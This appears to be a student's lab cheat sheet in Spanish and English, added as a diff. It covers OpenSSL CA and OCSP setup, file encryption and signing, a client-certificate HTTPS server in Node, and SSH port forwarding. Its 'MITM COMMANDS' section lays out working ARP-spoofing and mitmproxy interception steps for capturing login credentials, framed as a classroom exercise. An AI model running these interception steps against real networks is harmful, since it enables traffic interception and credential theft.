@@ -1,0 +1,370 @@
+#############################################################################
+######################### OPENSSL CONFIGURATION FILE ########################
+#############################################################################
+
+# Configure openssl parameters:
+
+    vi /etc/ssl/openssl.cnf
+
+
+#############################################################################
+######################### CA CERTIFICATE OPERATIONS #########################
+#############################################################################
+
+# Create CA private key and its associated certificate signing request:
+
+    openssl req -config openssl.cnf -new -keyout private/cakey.pem -out requests/careq.pem
+
+   #EXAMPLE:
+
+        # Country Name (2 letter code) [AU]:ES
+        # State or Province Name (full name) [Some-State]:Barcelona
+        # Locality Name (eg, city) []:Barcelona
+        # Organization Name (eg, company) [Internet Widgits Pty Ltd]:Network Security Org
+        # Organizational Unit Name (eg, section) []:Certification
+        # Common Name (e.g. server FQDN or YOUR name) []:NS Root CA
+
+   
+# Create CA certificate (cacert.pem), signing the careq.pem previosly generated:
+
+    openssl ca -config openssl.cnf -extensions v3_ca -days 3652 -create_serial -selfsign -in requests/careq.pem -out cacert.pem
+
+# Checking CA certificate content:
+
+    openssl x509 -noout -text -in cacert.pem
+
+# Revoke a certificate:
+
+    openssl ca -config openssl.cnf -revoke certs/testtlsserver.crt.pem
+
+# Extract public key from a Certificate:
+
+    openssl x509 -in certs/test_user.crt.pem -noout -pubkey > public_keys/test_user_public_key.pem
+
+#############################################################################
+############################ OCSP RESPONDER SETUP ###########################
+#############################################################################
+
+# Create OCSP responder private key and its associated certificate signing request: 
+
+    openssl req -config openssl.cnf -new -keyout private/ocspresponder.key.pem -out requests/ocspresponder.csr.pem
+
+    # IMPORTANTE:
+
+        # Los campos del DN tienen que cumplir con las policy configuradas para la CA
+        # El CN tiene que ser obligatoriamente la IP de la máquina
+
+    # EJEMPLO:
+        # Country Name (2 letter code) [AU]:ES
+        # State or Province Name (full name) [Some-State]:Barcelona
+        # Locality Name (eg, city) []:Barcelona
+        # Organization Name (eg, company) [Internet Widgits Pty Ltd]:Network Security Org
+        # Organizational Unit Name (eg, section) []:OCSP
+        # Common Name (e.g. server FQDN or YOUR name) []:10.0.2.15
+
+# Sign OCSP responder request:
+
+    openssl ca -config openssl.cnf  -extensions ocsp_responder_cert -in requests/ocspresponder.csr.pem -out certs/ocspresponder.crt.pem
+
+# Start OCSP responder at port 80:
+
+    sudo openssl ocsp -port 80 -text -index index.txt -CA cacert.pem -rkey private/ocspresponder.key.pem -rsigner certs/ocspresponder.crt.pem
+
+
+#############################################################################
+############################## CLIENT OPERATIONS ############################
+#############################################################################
+
+
+# Generar una solicitud de certificado para un SERVER
+
+    # OPCIÓN 1:
+
+        # Generar la llave en el cliente y posteriormente pasar el server.csr al server de la CA
+
+        openssl req -new -newkey rsa:2048 -keyout private/server.key -out server.csr.pem
+        
+
+    # OPCIÓN 2:
+
+        # Generar la llave en el servidor de la CA
+
+        openssl req -new -keyout private/testtlsserver.key.pem -out requests/testtlsserver.csr.pem
+
+# Sign certificate request CA para SERVER
+
+    openssl ca -config openssl.cnf -extensions server_cert -in requests/testtlsserver.csr.pem -out certs/testtlsserver.crt.pem
+
+# Generar una solicitud de certificado para un USER
+
+    openssl req -new -keyout private/test_user.key.pem -out requests/test_user.csr.pem
+
+# Sign certificate request CA para USER
+
+    openssl ca -config openssl.cnf -extensions user_cert -days 30 -in requests/test_user.csr.pem -out certs/test_user.crt.pem
+
+
+# Validar un certificado mediante OCSP Responder
+
+    openssl ocsp -CAfile cacert.pem -url http://10.0.2.3 -resp_text -issuer cacert.pem -cert certs/testtlsserver.crt.pem
+
+#############################################################################
+################################## NETWORKING ###############################
+#############################################################################
+
+ALICE IP:   10.0.2.3
+BOB IP:     10.0.2.4
+
+#############################################################################
+####################### CIFRADO DE ARCHIVOS GRANDES #########################
+#############################################################################
+
+# Cifrar un archivo con la clave OpenSSL
+# 
+# El sistema de clave pública y privada no puede cifrar archivos grandes, por lo que existe una forma de cifrar los archivos. 
+# Para cifrar un archivo grande con este método, primero debemos cifrar el archivo con cifrado simétrico. 
+# La clave de cifrado simétrico se calculará aleatoriamente con OpenSSL y es la clave que cifraremos con la clave pública previamente calculada.
+
+    https://www.redeszone.net/tutoriales/seguridad/cifra-archivos-de-forma-sencilla-con-openssl/
+
+
+# Generar clave compartida (-K)
+
+    openssl rand -hex 32 > sharedkey
+
+# Generar vector inicialización (-iv)
+
+    openssl rand -hex 16 > iv
+
+# Encriptar con llave simétrica el archivo (add -a al final para base64)
+
+    openssl enc -aes-256-cbc -in plaintext -out ciphertext -K bd57a0bd79e42af44c570dc73da4c328dc236b9c4320d9c985e0ec796cc6b55c -iv 53c73e819cbd75b985c68b8620e96cc0
+
+# El receptor genera su llave pública asimérica
+
+    openssl pkey -in receiver_cert.pem -out pubkey_receiver.pem -pubout
+
+    openssl x509 -in certs/test_user.crt.pem -noout -pubkey > public_keys/test_user_public_key.pem
+
+# Enviar la llave pública del receptor al emisor
+
+    Pasando el fichero por via scp o por la carpeta compartida
+
+# Cifrar la K compartida con la llave pública asimetrica del receptor
+
+    openssl pkeyutl -encrypt -in plaintext -out encryptedfile -inkey pubkey_receiver.pem -certin/-pubin
+
+# Enviar el archivo cifrado, el IV (puede ser en plano) y la K encriptada
+
+    Pasando el fichero por via scp o por la carpeta compartida
+
+# Desencriptar la K en el receptor:
+
+    openssl pkeyutl -decrypt -in encryptedfile -out decryptedFile -inkey keypairB.pem ##REVISAR
+
+# Desencriptar el archivo cifrado con llave pública en el receptor
+
+    openssl enc -aes-256-cbc -d -in ciphertext -out decryptedFile1 -K bd57a0bd79e42af44c570dc73da4c328dc236b9c4320d9c985e0ec796cc6b55c -iv 53c73e819cbd75b985c68b8620e96cc0
+
+
+#############################################################################
+######################### FIRMA DE ARCHIVOS GRANDES #########################
+#############################################################################
+
+# Sign
+
+    openssl pkeyutl -sign -in plaintext -out signature -inkey keypairA.pem
+
+# Verify 
+
+    openssl pkeyutl -verify -in plaintext -sigfile signature -inkey pubkeyA.pem -pubin
+
+# Para poder verificar archivos grandes, se debe generar priemro el digest (hash) y posteriormente se valida ese digest encriptado:
+
+    # Para generar y firmar el digest:
+
+        openssl dgst -sha256 -sign private_key.pem -out file.sha256 file-to-sign
+
+    # Se envía el fichero original + el digest encriptado al receptor
+    # Para verificar la autenticidad del emisor del fichero:
+
+        openssl dgst -sha256 -verify public_key.pem -signature file.sha256 file-to-sign
+
+
+
+#############################################################################
+##############################  WEBSERVER CERTS  ############################
+#############################################################################
+
+
+# Crear NPM Server:
+
+    sudo apt install npm
+
+    npm init
+
+   npm install express morgan
+
+# Arrancar servidor node:
+
+   sudo node index.js 
+
+
+# Generar un p12 desde un certificat
+
+    openssl pkcs12 -export -out user.p12 -inkey webuser.key.pem -in webuser.crt.pem 
+
+# Modificar index.js para añadir certificados etc...
+
+
+'use strict';
+
+const express = require('express');
+const logger = require('morgan');
+const https = require('https');
+const fs = require('fs');
+
+const tlsServerKey = fs.readFileSync('./tls/webserver.key.pem');
+const tlsServerCrt = fs.readFileSync('./tls/webserver.crt.pem');
+const tlsCACrt = fs.readFileSync('/media/sf_LAB/cacert.pem');
+
+const app = express();
+
+app.use(logger('dev')); // Log requests (GET, POST, ...)
+
+app.get('/', (request, response) => {
+    response.send('<h1>Hello Express!</h1>');
+});
+
+const httpsOptions = {
+    key: tlsServerKey,
+    cert: tlsServerCrt,
+    ca: tlsCACrt,
+    requestCert: true,
+	rejectUnauthorized: true
+};
+const server = https.createServer(httpsOptions, app);
+
+/**
+ * Listen on provided port, on all network interfaces.
+ */
+server.listen(443);
+server.on('listening', onListening);
+
+/**
+ * Event listener for HTTP server "listening" event.
+ */
+function onListening() {
+    const addr = server.address();
+    const bind = typeof addr === 'string'
+        ? 'pipe ' + addr
+        : 'port ' + addr.port;
+    console.log('Listening on ' + bind);
+}
+
+
+
+#############################################################################
+##############################   MITM COMMANDS   ############################
+#############################################################################
+
+# La idea de este ataque es interceptar la comunicación entre un usuario y el 
+# router, se consigue falsificando los mensajes ARP y forzando que la comunicación 
+# entre la víctima y el router se establezca a través del pc del atacante.
+
+# To discover possible victims we'll use NMAP:
+
+nmap -sP -PR <subnet_ip>/<subnet_mask>
+
+# Para que no se sospeche nada, el pc del atacante deberá redirigir el tráfico IP
+# y deshabilitar los redirects ICMP:
+
+# We edit the sysctl.conf file --> /etc/sysctl.conf (as root) and make sure:
+
+net.ipv4.ip_forward = 1
+net.ipv4.conf.all.send_redirects = 0
+
+# And reload the sysctl with the command:
+
+sysctl -p
+
+
+# To send fake ARP messages to the victim and the router:
+
+apt update
+apt install dsniff
+
+# We need to open 2 terminals and keep them running:
+
+    # Terminal 1:
+    arpspoof -t <gateway_ip> <victim_ip>
+
+    # Terminal 2:
+    arpspoof -t <victim_ip> <gateway_ip>
+
+# Open wireshark and sniff packets ;)
+
+###### MITMPROXY ####### --> To intercept TLS connetions
+
+# Install MITMproxy on attacker's PC
+
+apt update
+apt install dsniff python3-dev python3-pip libffi-dev libssl-deb
+pip3 install mitmproxy
+
+# redirect http/https traffic to MITMproxy
+
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port <listenport>
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port <listenport>
+
+# Run ARP spoofing:
+
+# We need to open 2 terminals and keep them running:
+
+    # Terminal 1:
+    arpspoof -t <gateway_ip> <victim_ip>
+
+    # Terminal 2:
+    arpspoof -t <victim_ip> <gateway_ip>
+
+# Run MITMProxy
+
+mitmproxy --mode transparent --showhost -p <listenport>
+
+# --> On victim's machine open a browser and install mitmproxy cert from http://mitm.it
+# navigate to ATENEA and introduce fake credentials
+
+# Check mitm  https messages on attacker's terminal --> look for a POST (login)
+
+
+
+#############################################################################
+##############################   SSH  COMMANDS   ############################
+#############################################################################
+
+#------------------- Local Prot Forwarding ---------------------#
+
+# arrancar el servidor de node en la MV2 sin la autenticación de cliente y https
+
+sudo node index.js      # requestCert:false
+
+# From MV1 we'll create a local forwarding:
+
+ssh -L 5000:localhost:443 kali@<ip_mv2>
+
+# If we open a browser on MV1 and navigate to https://localhost:5000 we'll be able to see node init page
+# Es redirecciona el port 443 de la MV2 al port 5000 de la MV1
+
+
+#------------------- Remote Port Forwarding ---------------------#
+
+# On MV1 install and start apache2 server:
+
+apt install apache2
+systemctl start apache2
+
+# On MV1 create a remote forwarding to MV2:
+
+ssh -R 8000:localhost:80 kali@<ip_mv2>
+
+# es redirecciona el port 80 de MV1 al port 8000 de la MV2
